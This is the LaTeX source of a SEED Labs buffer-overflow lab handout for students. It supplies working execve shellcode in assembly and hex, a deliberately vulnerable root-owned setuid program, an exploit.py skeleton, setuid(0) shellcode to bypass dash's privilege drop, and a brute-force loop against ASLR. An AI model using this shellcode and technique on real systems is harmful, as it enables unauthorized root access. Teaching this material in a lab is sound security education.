@@ -1,0 +1,814 @@
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  Copyright by Wenliang Du.                                       %%
+%%  This work is licensed under the Creative Commons                %%
+%%  Attribution-NonCommercial-ShareAlike 4.0 International License. %%
+%%  To view a copy of this license, visit                           %%
+%%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\newcommand{\commonfolder}{../../common-files}
+
+\input{\commonfolder/header}
+\input{\commonfolder/copyright}
+
+
+\newcommand{\bufFigs}{./Figs}
+
+\lhead{\bfseries SEED Labs -- Buffer Overflow Attack Lab (Set-UID Version)}
+
+\def \code#1 {\fbox{\scriptsize{\texttt{#1}}}}
+
+\begin{document}
+
+\begin{center}
+{\LARGE Buffer Overflow Attack Lab (Set-UID Version)}
+\end{center}
+
+\seedlabcopyright{2006 - 2020}
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Overview}
+
+Buffer overflow is defined as the condition in which a program attempts to
+write data beyond the boundary of a buffer. This
+vulnerability can be used by a malicious user to alter the flow control of
+the program, leading to the execution of malicious code.
+The objective of this lab is for students to gain practical
+insights into this type of vulnerability, and learn how to
+exploit the vulnerability in attacks.
+
+
+In this lab, students will be given a program with a buffer-overflow
+vulnerability; their task is to develop a scheme to exploit 
+the vulnerability and finally gain the root privilege.  In addition to the
+attacks, students will be guided to walk through several protection
+schemes that have been implemented in the operating system to counter against 
+buffer-overflow attacks.  Students need to evaluate 
+whether the schemes work or not and explain why. This lab
+covers the following topics:
+
+\begin{itemize}[noitemsep]
+\item Buffer overflow vulnerability and attack
+\item Stack layout 
+\item Address randomization, non-executable stack, and StackGuard
+\item Shellcode (32-bit and 64-bit)
+\item The return-to-libc attack, which aims at 
+defeating the non-executable stack countermeasure, is covered 
+in a separate lab.
+\end{itemize}
+
+
+\paragraph{Readings and videos.}
+Detailed coverage of the buffer-overflow attack can be found in the following:
+
+\begin{itemize}
+\item Chapter 4 of the SEED Book, \seedbook
+\item Section 4 of the SEED Lecture at Udemy, \seedcsvideo
+\end{itemize}
+
+
+\paragraph{Lab environment.} 
+\seedenvironmentC
+
+
+\paragraph{Note for instructors.} 
+Instructors should customize this lab by choosing a value
+for \texttt{L1}, \texttt{L2}, and \texttt{L3}. See    
+Section~\ref{sec:vulnerable_program} for details.
+Depending on the background of students and the time allocated 
+for this lab, instructors can also make the 
+Level-2 and Level-3 tasks optional. 
+The Level-1 task is sufficient to cover the basics of 
+the buffer-overflow vulnerability. Levels 2 and 3
+increase the difficulties of the attack. 
+All the countermeasure tasks are based on the Level-1 task, 
+so skipping Levels 2 and 3 will not affect those tasks. 
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Environment Setup}
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Turning Off Countermeasures}
+
+Modern operating systems have implemented several
+security mechanisms to make the buffer-overflow attack difficult. 
+To simplify our attacks, we need to disable them first. 
+Later on, we will enable them and 
+see whether our attack can still be successful or not.
+
+
+\paragraph{Address Space Randomization.}
+\ubuntu and several other Linux-based systems uses address space
+randomization to randomize the starting address of heap and
+stack. This makes guessing the exact addresses difficult; guessing
+addresses is one of the critical steps of buffer-overflow attacks.  
+This feature can be disabled using the following command:
+
+\begin{lstlisting}
+$ sudo sysctl -w kernel.randomize_va_space=0
+\end{lstlisting}
+
+
+\paragraph{Configuring \texttt{/bin/sh}.} In the recent versions of 
+Ubuntu OS, the \texttt{/bin/sh} symbolic link points to
+the \texttt{/bin/dash} shell. The \texttt{dash} program, as well
+as \texttt{bash},  has implemented a security countermeasure
+that prevents itself from being executed in a \setuid process. 
+Basically, if they detect that they are 
+executed in a \setuid process, they will immediately 
+change the effective user ID to the process's real user ID, essentially
+dropping the privilege. 
+
+
+Since our victim program is a \setuid program, and our 
+attack relies on running \texttt{/bin/sh}, the countermeasure
+in \texttt{/bin/dash} makes our attack more difficult. Therefore,
+we will link \texttt{/bin/sh} to another shell that does not 
+have such a countermeasure (in later tasks, we will show that with
+a little bit more effort, the countermeasure in \texttt{/bin/dash}
+can be easily defeated). We have installed a shell program 
+called \texttt{zsh} in our Ubuntu 20.04 VM. The following
+command can be used to link \texttt{/bin/sh} to \texttt{zsh}:
+
+\begin{lstlisting}
+$ sudo ln -sf /bin/zsh /bin/sh
+\end{lstlisting}
+
+
+\paragraph{StackGuard and Non-Executable Stack.} These are 
+two additional countermeasures implemented in the system. 
+They can be turned off during the compilation.
+We will discuss them later when we compile the vulnerable program.
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Task 1: Getting Familiar with Shellcode}
+
+The ultimate goal of buffer-overflow attacks is to inject
+malicious code into the target program, so the code can be 
+executed using the target program's privilege.
+Shellcode is widely used in most code-injection attacks. 
+Let us get familiar with it in this task.
+
+
+
+% -------------------------------------------
+% SUBSECTION
+% -------------------------------------------
+\subsection{The C Version of Shellcode} 
+
+A shellcode is basically a piece of code that launches a shell. 
+If we use C code to implement it, it will look like the following:
+
+
+\begin{lstlisting}[language=C]
+#include <stdio.h>
+
+int main() {
+   char *name[2];
+
+   name[0] = "/bin/sh";
+   name[1] = NULL;
+   execve(name[0], name, NULL);
+}
+\end{lstlisting}
+ 
+Unfortunately, we cannot just compile this code and use the binary code
+as our shellcode (detailed explanation is provided in the SEED book). 
+The best way to write a shellcode is to use assembly code. 
+In this lab, we only provide the binary version of a shellcode,
+without explaining how it works (it is non-trivial).
+If you are interested in how exactly shellcode works 
+and you want to write a shellcode from scratch, you
+can learn that from a separate SEED lab called \textit{Shellcode Lab}.
+
+
+% -------------------------------------------
+% SUBSECTION
+% -------------------------------------------
+\subsection{32-bit Shellcode} 
+
+
+\begin{lstlisting}[language={[x86masm]Assembler}] 
+; Store the command on stack
+xor  eax, eax
+push eax          
+push "//sh"
+push "/bin"
+mov  ebx, esp     ; ebx --> "/bin//sh": execve()'s 1st argument
+
+; Construct the argument array argv[]
+push eax          ; argv[1] = 0
+push ebx          ; argv[0] --> "/bin//sh"
+mov  ecx, esp     ; ecx --> argv[]: execve()'s 2nd argument
+
+; For environment variable 
+xor  edx, edx     ; edx = 0: execve()'s 3rd argument
+
+; Invoke execve()
+xor  eax, eax     ; 
+mov  al,  0x0b    ; execve()'s system call number
+int  0x80
+\end{lstlisting}
+
+
+The shellcode above basically invokes the \texttt{execve()} system call 
+to execute \texttt{/bin/sh}. In a separate SEED lab, the Shellcode lab, 
+we guide students to write 
+shellcode from scratch. Here we only give a very brief explanation. 
+
+\begin{itemize}
+\item The third instruction pushes \texttt{"//sh"}, rather than \texttt{"/sh"} into the 
+stack. This is because we need a 32-bit number here, and \texttt{"/sh"} 
+has only 24 bits. Fortunately, \texttt{"//"} is equivalent to \texttt{"/"}, so we can get 
+away with a double slash symbol. 
+
+\item We need to pass three arguments to {\tt execve()} via 
+the \texttt{ebx}, \texttt{ecx} and \texttt{edx} registers,    
+respectively. The majority of the shellcode basically constructs
+the content for these three arguments. 
+
+\item The system call \texttt{execve()} is called when we set \texttt{al} to
+\texttt{0x0b}, and execute \texttt{"int 0x80"}.
+\end{itemize}
+ 
+
+
+% -------------------------------------------
+% SUBSECTION
+% -------------------------------------------
+\subsection{64-Bit Shellcode} 
+
+We provide a sample 64-bit shellcode in the following.
+It is quite similar to the 32-bit shellcode, except that 
+the names of the registers are different and the 
+registers used by the \texttt{execve()} system call
+are also different. Some explanation of the code is given in the 
+comment section, and we will not provide detailed 
+explanation on the shellcode. 
+
+
+\begin{lstlisting}[language={[x86masm]Assembler}]
+xor  rdx, rdx        ; rdx = 0: execve()'s 3rd argument
+push rdx
+mov  rax, '/bin//sh' ; the command we want to run
+push rax             ; 
+mov  rdi, rsp        ; rdi --> "/bin//sh": execve()'s 1st argument 
+push rdx             ; argv[1] = 0
+push rdi             ; argv[0] --> "/bin//sh"
+mov  rsi, rsp        ; rsi --> argv[]: execve()'s 2nd argument
+xor  rax, rax
+mov  al,  0x3b       ; execve()'s system call number
+syscall              
+\end{lstlisting}
+
+
+
+% -------------------------------------------
+% SUBSECTION
+% -------------------------------------------
+\subsection{Task: Invoking the Shellcode} 
+
+We have generated the binary code from the assembly code above, and
+put the code in a C program called \texttt{call\_shellcode.c} inside
+the \texttt{shellcode} folder. If you would like to learn how to 
+generate the binary code yourself, you should work on the Shellcode lab. 
+In this task, we will test the shellcode. 
+
+\begin{lstlisting}[language=C, caption=\texttt{call\_shellcode.c}, label=call_shellcode]
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+const char shellcode[] =
+#if __x86_64__
+  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
+  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
+  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
+#else
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
+#endif
+;
+
+int main(int argc, char **argv)
+{
+   char code[500];
+
+   strcpy(code, shellcode); // Copy the shellcode to the stack
+   int (*func)() = (int(*)())code;
+
+   func();    // Invoke the shellcode from the stack
+   return 1;
+} 
+\end{lstlisting}
+ 
+The code above includes two copies of shellcode, one is 32-bit
+and the other is 64-bit. When we compile the program using 
+the \texttt{-m32} flag, the 32-bit version will be used; 
+without this flag, the 64-bit version will be used. 
+Using the provided \texttt{Makefile}, you can compile
+the code by typing \texttt{make}. 
+Two binaries will be created, \texttt{a32.out} (32-bit)
+and \texttt{a64.out} (64-bit). 
+Run them and describe your observations. 
+It should be noted that the compilation
+uses the \texttt{execstack} option, which allows 
+code to be executed from the stack; 
+without this option, the program will fail.
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Task 2: Understanding the Vulnerable Program}
+\label{sec:vulnerable_program}
+
+The vulnerable program used in this lab is called 
+\texttt{stack.c}, which is in the \texttt{code} folder. 
+This program has a buffer-overflow vulnerability,
+and your job is to exploit this vulnerability and gain the root privilege. 
+The code listed below has some non-essential information removed, 
+so it is slightly different from what you get from the lab setup file.
+
+
+\begin{lstlisting}[language=C, caption={The vulnerable program (\texttt{stack.c})}]
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+/* Changing this size will change the layout of the stack.
+ * Instructors can change this value each year, so students
+ * won't be able to use the solutions from the past. */
+#ifndef BUF_SIZE
+#define BUF_SIZE 100
+#endif
+
+int bof(char *str)
+{
+    char buffer[BUF_SIZE];
+
+    /* The following statement has a buffer overflow problem */ 
+    strcpy(buffer, str);          
+
+    return 1;
+}
+
+int main(int argc, char **argv)
+{
+    char str[517];
+    FILE *badfile;
+
+    badfile = fopen("badfile", "r");
+    fread(str, sizeof(char), 517, badfile);
+    bof(str);
+    printf("Returned Properly\n");
+    return 1;
+}
+\end{lstlisting}
+
+The above program has a buffer overflow vulnerability. It first 
+reads an input from a file called \texttt{badfile}, and then passes this
+input to another buffer in the function {\tt bof()}. The 
+original input can have a maximum length of \texttt{517} bytes, but the buffer
+in {\tt bof()} is only \texttt{BUF\_SIZE} bytes long, which is less than
+\texttt{517}. 
+Because {\tt strcpy()} does not check
+boundaries, buffer overflow will occur.
+Since this program is a root-owned \setuid program, if a normal user can exploit
+this buffer overflow vulnerability, the user might be 
+able to get a root shell.
+It should be noted that 
+the program gets its input from a file called \texttt{badfile}. This file
+is under users' control. Now, our objective is to 
+create the contents for \texttt{badfile}, such that when the vulnerable program
+copies the contents into its buffer, a root shell can be spawned.
+
+
+\paragraph{Compilation.}
+To compile the above vulnerable program, do not forget to 
+turn off the StackGuard and the non-executable stack protections 
+using the \texttt{-fno-stack-protector} and \texttt{"-z execstack"} options.
+After the compilation, we need to make the program a
+root-owned \setuid program. We can achieve this by first change the ownership of the program to
+\texttt{root} (Line \ding{192}), and then change the permission to \texttt{4755} to enable the
+\setuid bit (Line \ding{193}). It should be noted that changing ownership must be done before
+turning on the \setuid bit, because ownership change will cause the \setuid bit to be turned
+off.
+
+
+\begin{lstlisting}
+$ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
+$ sudo chown root stack          (*@\ding{192}@*)
+$ sudo chmod 4755 stack          (*@\ding{193}@*)
+\end{lstlisting}
+
+The compilation and setup commands are already included in \texttt{Makefile}, 
+so we just need to type \texttt{make} to execute those commands. 
+The variables \texttt{L1}, \texttt{L2}, and \texttt{L3} are 
+set in \texttt{Makefile}; they will be used during the compilation. 
+If the instructor has chosen a different set of values 
+for these variables, you need to change them in \texttt{Makefile}.
+
+
+\paragraph{For instructors (customization).}
+To make the lab slightly different from the one offered in the past,
+instructors can change the value for \texttt{BUF\_SIZE} by requiring 
+students to compile the server code using different \texttt{BUF\_SIZE} values. 
+In \texttt{Makefile}, the \texttt{BUF\_SIZE} value is set by
+three variables \texttt{L1}, \texttt{L2}, and \texttt{L3}. 
+Instructors should pick the values for these variables based 
+on the following suggestions:
+
+\begin{itemize}[noitemsep]
+\item \texttt{L1}: pick a number between 100 and 400 
+\item \texttt{L2}: pick a number between 100 and 400 
+\item \texttt{L3}: we need to keep this number smaller, so the Level-3 task
+is different from the Level-2 task. Since there are not many choices,
+we will fix this number at 10.
+\end{itemize}
+ 
+
+
+
+
+% *******************************************
+% SECTION
+% *******************************************
+\section{Task 3: Launching Attack on 32-bit Program (Level 1)}
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Investigation} 
+
+To exploit the buffer-overflow vulnerability in the target program,
+the most important thing to know is the distance between the 
+buffer's starting position and the place where the return-address
+is stored. We will use a debugging method to find it out.
+Since we have the source code of the target program, we
+can compile it with the debugging flag turned on. That will make it more
+convenient to debug. 
+
+We will add the \texttt{-g} flag to \texttt{gcc} command, so debugging information
+is added to the binary. If you run \texttt{make}, the debugging version
+is already created. We will use \texttt{gdb} to debug \texttt{stack-L1-dbg}.  
+We need to create a file called
+\texttt{badfile} before running the program. 
+
+
+\newcommand{\pointleft}{\reflectbox{\ding{221}}\xspace}
+
+\begin{lstlisting}
+$ touch badfile       (*@\pointleft \textbf{Create an empty badfile}@*)
+$ gdb stack-L1-dbg
+gdb-peda$ b bof       (*@\pointleft \textbf{Set a break point at function bof()}@*)
+Breakpoint 1 at 0x124d: file stack.c, line 18.
+gdb-peda$ run         (*@\pointleft \textbf{Start executing the program}@*)
+...
+Breakpoint 1, bof (str=0xffffcf57 ...) at stack.c:18
+18  {
+gdb-peda$ next        (*@\pointleft \textbf{See the note below}@*)
+...
+22	    strcpy(buffer, str);
+gdb-peda$ p $ebp      (*@\pointleft \textbf{Get the ebp value}@*)
+$1 = (void *) 0xffffdfd8   
+gdb-peda$ p &buffer   (*@\pointleft \textbf{Get the buffer's address}@*)
+$2 = (char (*)[100]) 0xffffdfac
+gdb-peda$ quit        (*@\pointleft \textbf{exit}@*)
+\end{lstlisting}
+
+\paragraph{Note 1.} When \texttt{gdb} stops inside the \texttt{bof()} function, it 
+stops before the \texttt{ebp} register is set
+to point to the current stack frame, so if we print out the value of 
+\texttt{ebp} here, we will get the caller's \texttt{ebp} value. We need to use 
+\texttt{next} to execute a few instructions and stop 
+after the \texttt{ebp} register is modified to point to the stack
+frame of the \texttt{bof()} function. 
+The SEED book is based on Ubuntu 16.04, and \texttt{gdb}'s behavior is slightly
+different, so the book does not have the \texttt{next} step. 
+
+\paragraph{Note 2.}
+It should be noted that the frame pointer value
+obtained from \texttt{gdb} is different from that during the actual
+execution (without using \texttt{gdb}). This is because \texttt{gdb}  
+has pushed some environment data into the stack before running the debugged program. 
+When the program runs directly without using \texttt{gdb},
+the stack does not have those data, so the actual frame pointer value 
+will be larger. You should keep this in mind when constructing 
+your payload. 
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Launching Attacks} 
+
+To exploit the buffer-overflow vulnerability in the target program,
+we need to prepare a payload, and save it inside \texttt{badfile}. 
+We will use a Python program to do that.
+We provide a skeleton program called \texttt{exploit.py}, which
+is included in the lab setup file.
+The code is incomplete, and students need to replace some of the essential
+values in the code.
+
+
+\newcommand{\needtochange}{\ding{73} Need to change \ding{73}}
+
+
+\begin{lstlisting}[language=python, caption={\texttt{exploit.py}}]
+#!/usr/bin/python3
+import sys
+
+shellcode= (
+  ""                    # (*@\needtochange@*)
+).encode('latin-1')
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517))
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 0               # (*@\needtochange@*)
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value
+# and put it somewhere in the payload
+ret    = 0x00           # (*@\needtochange@*)
+offset = 0              # (*@\needtochange@*)
+
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+  f.write(content)
+\end{lstlisting}
+
+
+After you finish the above program, run it. This will generate
+the contents for \texttt{badfile}. Then run the vulnerable 
+program {\tt stack}. If your exploit is implemented correctly, you should 
+be able to get a root shell:  
+
+
+\begin{lstlisting}
+$./exploit.py     // create the badfile
+$./stack-L1       // launch the attack by running the vulnerable program
+# <---- Bingo! You've got a root shell! 
+\end{lstlisting}
+
+In your lab report, in addition to providing screenshots to demonstrate
+your investigation and attack, 
+you also need to explain how the values used in your 
+\texttt{exploit.py} are decided. These values are the most 
+important part of the attack, so a detailed explanation can help
+the instructor grade your report. Only demonstrating a successful
+attack without explaining why the attack works will not 
+receive many points. 
+
+
+
+% *******************************************
+% SECTION
+% *******************************************
+\section{Task 4: Launching Attack on 64-bit Program (Level 2)}
+
+In this task, we will compile the vulnerable program 
+into a 64-bit binary called \texttt{stack-L2}.  
+We will launch attacks on this program. The compilation and setup
+commands are already included in \texttt{Makefile}. Similar to
+the previous task, detailed explanation of your attack needs to be provided 
+in the lab report. 
+
+
+Using \texttt{gdb} to conduct an investigation on 64-bit programs 
+is the same as that on 32-bit programs.
+The only difference is the name of the register for the frame pointer.
+In the x86 architecture,
+the frame pointer is \texttt{ebp}, while in the x64 architecture,
+it is \texttt{rbp}. 
+
+
+\paragraph{Challenges.} Compared to buffer-overflow attacks on 32-bit
+machines, attacks on 64-bit machines is more difficult. The most
+difficult part is the address. Although the x64 architecture
+supports 64-bit address space, only the address from
+\texttt{0x00} through \texttt{0x00007FFFFFFFFFFF} is allowed. That means for
+every address (8 bytes), the highest two bytes are always zeros.
+This causes a problem.
+
+In our buffer-overflow attacks, we need to store at least one address
+in the payload, and the payload will be copied into the stack via
+\texttt{strcpy()}. We know that the \texttt{strcpy()} function
+will stop copying when it sees a zero. Therefore, if zero
+appears in the middle of the payload, the content after the
+zero cannot be copied into the stack. How to solve this
+problem is the most difficult challenge in this attack.
+
+
+
+
+% *******************************************
+% SECTION
+% *******************************************
+\section{Task 5: Launching Attack on 64-bit Program (Level 3)}
+
+
+The target program (\texttt{stack-L3}) in this task is similar to the one in the Level 2,
+except that the buffer size is extremely small. We set the 
+buffer size to 10, while in Level 2, the buffer size is much larger. 
+Your goal is the same: get the root shell by attacking this \setuid program. 
+You may encounter additional challenges in this attack 
+due to the small buffer size. 
+If that is the case, you need to explain how your have solved 
+those challenges in your attack. 
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Tasks 6: Defeating \texttt{dash}'s Countermeasure}
+
+The \texttt{dash} shell in the Ubuntu OS 
+drops privileges when it detects that the effective UID does not 
+equal to the real UID (which is the case in a \setuid program). 
+This is achieved by changing the 
+effective UID back to the real UID, essentially, dropping the 
+privilege.  In the previous tasks, we let \texttt{/bin/sh} points
+to another shell called \texttt{zsh}, which does not have such
+a countermeasure. In this task, we will change it back, 
+and see how we can defeat the countermeasure. Please 
+do the following, so \texttt{/bin/sh} points back to 
+\texttt{/bin/dash}. 
+
+
+\begin{lstlisting}
+$ sudo ln -sf /bin/dash /bin/sh
+\end{lstlisting}
+
+To defeat the countermeasure in buffer-overflow attacks,
+all we need to do is to change the real UID, so it equals the 
+effective UID. When a root-owned \setuid program runs, the 
+effective UID is zero, so before we invoke the shell program,
+we just need to change the real UID to zero.
+We can achieve this by invoking \texttt{setuid(0)} before executing 
+\texttt{execve()} in the shellcode. 
+
+The following assembly code shows how to invoke
+\texttt{setuid(0)}. The binary code is already put inside 
+\texttt{call\_shellcode.c}. You just need to add it to the 
+beginning of the shellcode. 
+
+\begin{lstlisting}[language={[x86masm]Assembler}]
+; Invoke setuid(0): 32-bit
+xor ebx, ebx      ; ebx = 0: setuid()'s argument
+xor eax, eax
+mov  al, 0xd5     ; setuid()'s system call number
+int 0x80
+
+; Invoke setuid(0): 64-bit
+xor rdi, rdi      ; rdi = 0: setuid()'s argument
+xor rax, rax       
+mov  al, 0x69     ; setuid()'s system call number
+syscall
+\end{lstlisting}
+
+
+\paragraph{Experiment.} Compile \texttt{call\_shellcode.c} into
+root-owned binary (by typing \texttt{"make setuid"}). 
+Run the shellcode \texttt{a32.out} and \texttt{a64.out} with or without 
+the \texttt{setuid(0)} system call. Please describe and explain
+your observations. 
+
+\paragraph{Launching the attack again.}
+Now, using the updated shellcode, we can attempt the attack 
+again on the vulnerable program, and this time, with the 
+shell's countermeasure turned on. Repeat your attack
+on Level 1, and see whether 
+you can get the root shell. After getting the root shell,
+please run the following command to prove that the countermeasure
+is turned on. Although repeating the attacks on Levels 2 and 3 
+are not required, feel free to do that and see whether they work or not.
+
+\begin{lstlisting}
+# ls -l /bin/sh /bin/zsh /bin/dash
+\end{lstlisting}
+ 
+
+
+% *******************************************
+% SECTION
+% *******************************************
+\section{Task 7: Defeating Address Randomization}
+
+On 32-bit Linux machines, stacks only have 19 bits of entropy, which means the stack base
+address can have $2^{19} = 524,288$ possibilities.  This number is not that high and can be
+exhausted easily with the brute-force approach. In this task,
+we use such an approach to defeat the address randomization countermeasure 
+on our 32-bit VM. 
+First, we turn on the Ubuntu's address randomization using the 
+following command. Then we run the same attack
+against \texttt{stack-L1}.
+Please describe and explain your observation.
+
+\begin{lstlisting}
+$ sudo /sbin/sysctl -w kernel.randomize_va_space=2
+\end{lstlisting}
+
+
+We then use the brute-force approach to attack the vulnerable program repeatedly, hoping that 
+the address we put in the \texttt{badfile} can eventually be correct. We will only try
+this on \texttt{stack-L1}, which is a 32-bit program. 
+You can use the following shell script to run the vulnerable program in an infinite loop. If your
+attack succeeds, the script will stop; otherwise, it will keep running. Please be patient,
+as this may take a few minutes, but if you are very unlucky,
+it may take longer. Please describe your observation.
+
+
+\begin{lstlisting}[language=bash]
+#!/bin/bash
+
+SECONDS=0
+value=0
+
+while true; do
+  value=$(( $value + 1 ))
+  duration=$SECONDS
+  min=$(($duration / 60))
+  sec=$(($duration % 60))
+  echo "$min minutes and $sec seconds elapsed."
+  echo "The program has been running $value times so far."
+  ./stack-L1
+done
+\end{lstlisting}
+
+
+Brute-force attacks on 64-bit programs is much harder, because the entropy
+is much larger. Although this is not required, free free to try it just for fun. 
+Let it run overnight. Who knows, you may be very lucky. 
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Tasks 8: Experimenting with Other Countermeasures}
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Task 8.a: Turn on the StackGuard Protection}
+
+Many compiler, such as \texttt{gcc}, implements a security mechanism called
+\textit{StackGuard} to prevent buffer overflows. In the presence of this
+protection, buffer overflow attacks will not work.
+In our previous tasks, we disabled the StackGuard protection mechanism
+when compiling the programs. In this task, we will turn it on and
+see what will happen.
+
+First, repeat the Level-1 attack with the StackGuard off, and make sure that the
+attack is still successful. Remember to turn off the address randomization, because
+you have turned it on in the previous task.
+Then, we turn on the StackGuard protection by
+recompiling the vulnerable \texttt{stack.c} program without the
+\texttt{-fno-stack-protector} flag.
+In \texttt{gcc} version 4.3.3 and above, StackGuard is enabled by
+default. Launch the attack; report and explain your observations.
+
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Task 8.b: Turn on the Non-executable Stack Protection}
+
+\input{part_nonexecutable_stack}
+
+
+
+% *******************************************
+% SECTION
+% *******************************************
+\section{Submission}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\input{\commonfolder/submission}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\end{document}
